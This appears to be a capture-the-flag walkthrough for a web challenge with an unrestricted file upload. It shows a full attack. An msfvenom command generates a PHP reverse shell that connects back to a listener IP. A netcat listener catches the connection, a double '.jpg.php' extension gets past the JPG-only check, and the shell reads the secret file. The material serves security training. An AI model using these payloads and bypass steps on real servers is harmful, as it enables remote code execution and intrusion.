# Challenge #2 - Tomato Lovers 2

## Objectives

- The website owner has received your suggestion of limiting the type of files being accepted in the upload web form.
- They decided to allow only JPG files. Your objective is to determine if the security mechanism in place has really fixed the vulnerability.
- In order to prove that the threat is still there, you should upload a file that let you run PHP commands on the server.
- You will find a trophy in the file readthissecret.php in the website root

## What you will learn

- How to find and exploit vulnerable upload forms
- How to determine the impact related to an Unrestricted File Upload vulnerability
- How to write your own PHP Shell

## Steps


Craft a php shell to upload. Replace the IP with your own VPN IP. The extension must be a valid

```bash
msfvenom -p php/reverse_php lhost=10.100.13.200 lport=1234 -o shell.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 3007 bytes
Saved as: shell.php
```

Upload this filea on the photo section.

```
http://2.challenge.fileres.site/index.php?section=photos
```

Open a terminal and start a netcat session.

```
nc -nvlp 1234
```

This time, you will receive an error message.

```
Invalid file type! Only JPG files allowed
```

Rename your file to shell.jpg.php and send again.

Request your file on the uploads page.

```
http://2.challenge.fileres.site/uploads/shell.jpg.php
```

On your new shell session read the secret file.

```html
cat ../readthissecret.php
<?php

// YOUR SECRET IS: <<$trophy>>
```